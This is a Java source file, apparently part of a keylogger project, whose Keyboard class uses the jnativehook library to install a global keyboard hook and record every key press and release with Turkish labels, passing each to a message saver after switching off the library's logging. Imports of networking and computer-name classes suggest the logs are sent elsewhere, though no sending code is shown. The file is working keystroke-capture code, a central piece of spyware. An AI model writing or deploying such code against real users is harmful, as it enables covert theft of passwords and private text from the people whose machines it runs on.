package keyboard;

import java.io.IOException;
import java.util.HashMap;

import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import ComputerNameSettings.ComputerNameSolver;
import messages.MessageSaver;
import net.Net;

public class Keyboard extends Thread {
	MessageSaver saver = new MessageSaver();

	@Override
	public void run() {
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}
		// Get the logger for "org.jnativehook" and set the level to off.
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);

		logger.setUseParentHandlers(false);
		NativeKeyListener list = new NativeKeyListener() {
			@Override
			public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

			}

			@Override
			public void nativeKeyPressed(NativeKeyEvent e) {

				try {

					String gonderilecekText = "Basildi  - " + NativeKeyEvent.getKeyText(e.getKeyCode());
					addMessage(gonderilecekText);

				}

				catch (Exception ex) {
					ex.getStackTrace();

				}

			}

			@Override
			public void nativeKeyReleased(NativeKeyEvent e) {

				try {
					String gonderilecekText = "Çekildi  - " + NativeKeyEvent.getKeyText(e.getKeyCode());
					addMessage(gonderilecekText);

				}

				catch (Exception ex) {

				}

			}
		};
		GlobalScreen.addNativeKeyListener(list);

	}

	protected void addMessage(String gonderilecekText) throws IOException {

		System.out.println(gonderilecekText);
		saver.addMessage(gonderilecekText);

	}

}
